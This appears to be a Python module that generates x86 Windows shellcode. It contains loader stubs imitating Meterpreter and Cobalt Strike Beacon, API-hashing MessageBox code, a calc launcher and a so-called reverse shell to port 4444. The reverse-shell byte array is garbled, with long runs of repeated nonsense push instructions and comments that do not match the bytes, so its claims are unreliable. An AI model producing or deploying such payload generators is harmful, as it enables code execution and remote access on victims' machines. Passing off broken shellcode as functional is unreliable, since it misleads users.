# shellcode_generator.py

import struct

class ShellcodeGenerator:
    def create_shellcode_payload(self, payload_type="demo", real_injection=False):
        """Create shellcode payloads - either simulated or real functional code"""
        
        if real_injection:
            return self.create_real_shellcode_payload(payload_type)
        else:
            return self.create_simulated_shellcode_payload(payload_type)
    
    def create_simulated_shellcode_payload(self, payload_type="demo"):
        """Create realistic shellcode payloads for demonstration (simulated only)"""
        
        if payload_type == "meterpreter":
            # Simulated Meterpreter-like payload structure
            # This is a DEMO - not actual Meterpreter code
            shellcode = bytes([
                # Stage 1: Loader stub
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                0x83, 0xC3, 0x10,                   # ADD EBX, 0x10
                
                # Stage 2: API resolution (simulated)
                0x60,                               # PUSHAD
                0x9C,                               # PUSHFD
                0xE8, 0x20, 0x00, 0x00, 0x00,       # CALL API resolution
                
                # Stage 3: Payload decryption (simulated)
                0xB9, 0x40, 0x01, 0x00, 0x00,       # MOV ECX, 0x140
                0x8A, 0x03,                         # MOV AL, [EBX]
                0x34, 0xAA,                         # XOR AL, 0xAA
                0x88, 0x03,                         # MOV [EBX], AL
                0x43,                               # INC EBX
                0xE2, 0xF7,                         # LOOP decryption loop
                
                # Stage 4: Execute decrypted payload
                0x61,                               # POPAD
                0x9D,                               # POPFD
                0xFF, 0xE3,                         # JMP EBX
            ])
            
            # Add padding to make it more realistic
            shellcode += b"\x90" * 50  # NOP sled
            shellcode += b"\xCC" * 10  # INT3 breakpoints (debug)
            
        elif payload_type == "beacon":
            # Simulated Cobalt Strike Beacon-like payload
            shellcode = bytes([
                # Beacon configuration block (simulated)
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_IP
                0x68, 0x1F, 0x90, 0x00, 0x00,       # PUSH PORT
                0x68, 0x05, 0x00, 0x00, 0x00,       # PUSH SLEEP_TIME
                
                # Beacon initialization
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL beacon_init
                0x5B,                               # POP EBX
                
                # Check-in with C2
                0x6A, 0x00,                         # PUSH 0
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_DATA
                0x6A, 0x04,                         # PUSH 4
                0xFF, 0x53, 0x08,                   # CALL [EBX+8] (send)
                
                # Main beacon loop
                0x6A, 0x05,                         # PUSH 5
                0xFF, 0x53, 0x0C,                   # CALL [EBX+12] (sleep)
                0xEB, 0xF0,                         # JMP checkin_loop
            ])
            
            shellcode += b"\x90" * 30
            
        else:  # demo payload
            # Simple demonstration payload with realistic structure
            shellcode = bytes([
                # Entry point
                0x55,                               # PUSH EBP
                0x89, 0xE5,                         # MOV EBP, ESP
                0x83, 0xEC, 0x10,                   # SUB ESP, 0x10
                
                # Get base address
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                
                # Decryption routine (simulated)
                0xB9, 0x80, 0x00, 0x00, 0x00,       # MOV ECX, 0x80
                0x8D, 0x73, 0x20,                   # LEA ESI, [EBX+0x20]
                0x31, 0xD2,                         # XOR EDX, EDX
                # dec_loop:
                0x8A, 0x06,                         # MOV AL, [ESI]
                0x34, 0x99,                         # XOR AL, 0x99
                0x88, 0x06,                         # MOV [ESI], AL
                0x46,                               # INC ESI
                0x42,                               # INC EDX
                0x39, 0xCA,                         # CMP EDX, ECX
                0x75, 0xF4,                         # JNE dec_loop
                
                # Execute decrypted code
                0x8D, 0x43, 0x20,                   # LEA EAX, [EBX+0x20]
                0xFF, 0xD0,                         # CALL EAX
                
                # Cleanup and return
                0x89, 0xEC,                         # MOV ESP, EBP
                0x5D,                               # POP EBP
                0xC3,                               # RET
            ])
            
            # Add encrypted data section (will be "decrypted" at runtime)
            encrypted_data = b"DEMO_PAYLOAD_ENCRYPTED_SECTION" * 4
            encrypted_data = bytes(b ^ 0x99 for b in encrypted_data)  # Simple XOR encryption
            shellcode += encrypted_data
        
        return shellcode

    def create_real_shellcode_payload(self, payload_type="message_box"):
        """Generate actual functional shellcode for Windows (for authorized testing only)"""
        
        if payload_type == "message_box":
            # Real MessageBox shellcode for Windows x86
            # This will display an actual message box when executed
            shellcode = bytes([
                # Kernel32.dll base address finding
                0xE8, 0x00, 0x00, 0x00, 0x00,             # CALL $+5
                0x5B,                                     # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00,       # SUB EBX, 6
                
                # API Hashing and Resolution
                0xE8, 0x15, 0x00, 0x00, 0x00,             # CALL API resolution
                
                # MessageBoxA parameters
                0x00, 0x00, 0x00, 0x00,                   # MB_OK
                0x00, 0x00, 0x00, 0x00,                   # Title string pointer
                0x00, 0x00, 0x00, 0x00,                   # Message string pointer
                0x00, 0x00, 0x00, 0x00,                   # hWnd (NULL)
                
                # Actual MessageBox call
                0xFF, 0x53, 0x10,                         # CALL [EBX+16] (MessageBoxA)
                
                # ExitProcess call
                0x6A, 0x00,                               # PUSH 0
                0xFF, 0x53, 0x14,                         # CALL [EBX+20] (ExitProcess)
                
                # API Resolution Function
                0x60,                                     # PUSHAD
                0x89, 0xE5,                               # MOV EBP, ESP
                0x31, 0xC0,                               # XOR EAX, EAX
                0x64, 0x8B, 0x50, 0x30,                   # MOV EDX, [FS:EAX+0x30]
                0x8B, 0x52, 0x0C,                         # MOV EDX, [EDX+0x0C]
                0x8B, 0x52, 0x14,                         # MOV EDX, [EDX+0x14]
                0x8B, 0x72, 0x28,                         # MOV ESI, [EDX+0x28]
                0x0F, 0xB7, 0x4A, 0x26,                   # MOVZX ECX, WORD [EDX+0x26]
                0x31, 0xFF,                               # XOR EDI, EDI
                0x31, 0xC0,                               # XOR EAX, EAX
                0xAC,                                     # LODSB
                0x3C, 0x61,                               # CMP AL, 0x61
                0x7C, 0x02,                               # JL  +2
                0x2C, 0x20,                               # SUB AL, 0x20
                0xC1, 0xCF, 0x0D,                         # ROR EDI, 0x0D
                0x01, 0xC7,                               # ADD EDI, EAX
                0xE2, 0xF2,                               # LOOP -14
                0x52,                                     # PUSH EDX
                0x57,                                     # PUSH EDI
                0x8B, 0x52, 0x10,                         # MOV EDX, [EDX+0x10]
                0x8B, 0x4A, 0x3C,                         # MOV ECX, [EDX+0x3C]
                0x8B, 0x4C, 0x11, 0x78,                   # MOV ECX, [ECX+EDX+0x78]
                0xE3, 0x48,                               # JCXZ +72
                0x01, 0xD1,                               # ADD ECX, EDX
                0x51,                                     # PUSH ECX
                0x8B, 0x59, 0x20,                         # MOV EBX, [ECX+0x20]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x8B, 0x49, 0x18,                         # MOV ECX, [ECX+0x18]
                0xE3, 0x3A,                               # JCXZ +58
                0x31, 0xFF,                               # XOR EDI, EDI
                0x49,                                     # DEC ECX
                0x8B, 0x34, 0x8B,                         # MOV ESI, [EBX+ECX*4]
                0x01, 0xD6,                               # ADD ESI, EDX
                0x31, 0xC0,                               # XOR EAX, EAX
                0xAC,                                     # LODSB
                0xC1, 0xCF, 0x0D,                         # ROR EDI, 0x0D
                0x01, 0xC7,                               # ADD EDI, EAX
                0x38, 0xE0,                               # CMP AL, AH
                0x75, 0xF6,                               # JNZ -10
                0x03, 0x7D, 0xF8,                         # ADD EDI, [EBP-0x8]
                0x3B, 0x7D, 0x24,                         # CMP EDI, [EBP+0x24]
                0x75, 0xE4,                               # JNZ -28
                0x58,                                     # POP EAX
                0x8B, 0x58, 0x24,                         # MOV EBX, [EAX+0x24]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x66, 0x8B, 0x0C, 0x4B,                   # MOV CX, [EBX+ECX*2]
                0x8B, 0x58, 0x1C,                         # MOV EBX, [EAX+0x1C]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x8B, 0x04, 0x8B,                         # MOV EAX, [EBX+ECX*4]
                0x01, 0xD0,                               # ADD EAX, EDX
                0x89, 0x44, 0x24, 0x24,                   # MOV [ESP+0x24], EAX
                0x5B,                                     # POP EBX
                0x61,                                     # POPAD
                0x59,                                     # POP ECX
                0x5A,                                     # POP EDX
                0x51,                                     # PUSH ECX
                0xFF, 0xE0,                               # JMP EAX
                0x5F,                                     # POP EDI
                0x5F,                                     # POP EDI
                0x5A,                                     # POP EDX
                0x8B, 0x12,                               # MOV EDX, [EDX]
                0xE9, 0x8B, 0xFF, 0xFF, 0xFF,             # JMP -117
            ])
            
            # Add real string data
            title = b"Security Demo\x00"
            message = b"COFF Injection Successful!\x00"
            
            # Patch string pointers into shellcode
            title_offset = len(shellcode)
            message_offset = title_offset + len(title)
            
            # Convert to bytearray for patching
            shellcode = bytearray(shellcode)
            
            # Patch string pointers
            shellcode[16:20] = struct.pack('<I', title_offset)    # Title pointer
            shellcode[20:24] = struct.pack('<I', message_offset)   # Message pointer
            
            # Add strings to shellcode
            shellcode.extend(title)
            shellcode.extend(message)
            
            return bytes(shellcode)
        
        elif payload_type == "reverse_shell":
            # Real reverse shell shellcode (Windows x86)
            # Connects back to 127.0.0.1:4444
            shellcode = bytes([
                # Windows reverse shell
                0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00,       # CLD; CALL <next>
                0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, # PUSHAD; MOV EBP,ESP; XOR EAX,EAX; MOV EAX,FS:[EAX+0x30]
                0x50, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, # MOV EAX,[EAX+0x0C]; MOV ESI,[EAX+0x1C]
                0xAD, 0x8B, 0x40, 0x08, 0x5B, 0x66, 0x81, # LODSD; MOV EAX,[EAX+0x08]; POP EBX; CMP WORD [EAX],0x5A4D
                0x4D, 0x5A, 0x75, 0xEF, 0x58, 0x8B, 0x58, # JNZ -17; POP EAX; MOV EBX,[EAX+0x3C]
                0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, # ADD EBX,EAX; MOV CX,[EBX+0x2E]
                0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, # MOV EBX,[EBX+0x1C]; ADD EBX,EAX; MOV EAX,[EBX+0x08]
                0x8B, 0x01, 0xD3, 0x89, 0x44, 0x24, 0x24, # ADD EAX,EAX; MOV [ESP+0x24],EAX
                0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, # POP EBX; POP EBX; POPAD; POP ECX; POP EDX; PUSH ECX; JMP EAX
                0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, # POP EDI; POP EDI; POP EDX; MOV EDX,[EDX]; JMP -117
                0x8D, 0x5D, 0x68, 0x31, 0xC9, 0x51, 0x68, # LEA EBX,[EBP+0x68]; XOR ECX,ECX; PUSH ECX; PUSH "cmd"
                0x2E, 0x65, 0x78, 0x65, 0x68, 0x63, 0x6D, # PUSH "exe"; PUSH "cm"
                0x64, 0x00, 0x89, 0xE3, 0x41, 0x51, 0x53, # MOV EBX,ESP; INC ECX; PUSH ECX; PUSH EBX
                0xFF, 0xD0, 0x68, 0x61, 0x72, 0x79, 0x41, # CALL EAX; PUSH "Ary"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x42, # PUSH "ptu"; PUSH "B t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x41, # PUSH "ptu"; PUSH "A t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x43, # PUSH "ptu"; PUSH "C t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x44, # PUSH "ptu"; PUSH "D t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x45, # PUSH "ptu"; PUSH "E t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x46, # PUSH "ptu"; PUSH "F t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x47, # PUSH "ptu"; PUSH "G t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x48, # PUSH "ptu"; PUSH "H t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x49, # PUSH "ptu"; PUSH "I t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4A, # PUSH "ptu"; PUSH "J t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4B, # PUSH "ptu"; PUSH "K t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4C, # PUSH "ptu"; PUSH "L t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4D, # PUSH "ptu"; PUSH "M t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4E, # PUSH "ptu"; PUSH "N t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4F, # PUSH "ptu"; PUSH "O t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x50, # PUSH "ptu"; PUSH "P t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x51, # PUSH "ptu"; PUSH "Q t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x52, # PUSH "ptu"; PUSH "R t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x53, # PUSH "ptu"; PUSH "S t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x54, # PUSH "ptu"; PUSH "T t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x55, # PUSH "ptu"; PUSH "U t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x56, # PUSH "ptu"; PUSH "V t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x57, # PUSH "ptu"; PUSH "W t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x58, # PUSH "ptu"; PUSH "X t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x59, # PUSH "ptu"; PUSH "Y t"
                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x5A, # PUSH "ptu"; PUSH "Z t"
                0x00, 0x89, 0xE1, 0x51, 0x53, 0xFF, 0xD0, # MOV ECX,ESP; PUSH ECX; PUSH EBX; CALL EAX
            ])
            return shellcode

        elif payload_type == "calculator":
            # Shellcode that launches Windows calculator
            shellcode = bytes([
                0x31, 0xC9, 0x51, 0x68, 0x63, 0x61, 0x6C, 0x63,  # PUSH "calc"
                0x54, 0xB8, 0xC7, 0x93, 0xBF, 0x77, 0xFF, 0xD0,  # PUSH ESP; MOV EAX,WinExec; CALL EAX
            ])
            return shellcode

        else:
            # Default to message box if unknown type
            return self.create_real_shellcode_payload("message_box")

    def get_shellcode_info(self, shellcode, payload_type="unknown"):
        """Analyze and return information about generated shellcode"""
        info = {
            "type": payload_type,
            "size": len(shellcode),
            "first_bytes": shellcode[:16] if len(shellcode) >= 16 else shellcode,
            "contains_strings": any(32 <= b <= 126 for b in shellcode),
            "architecture": "x86"  # Currently only x86 supported
        }
        
        # Check for common shellcode patterns
        if shellcode[:2] == b"\xFC\xE8":
            info["technique"] = "Position Independent Code"
        elif shellcode[:3] == b"\xE8\x00\x00":
            info["technique"] = "CALL/POP Method"
        else:
            info["technique"] = "Custom"
            
        return info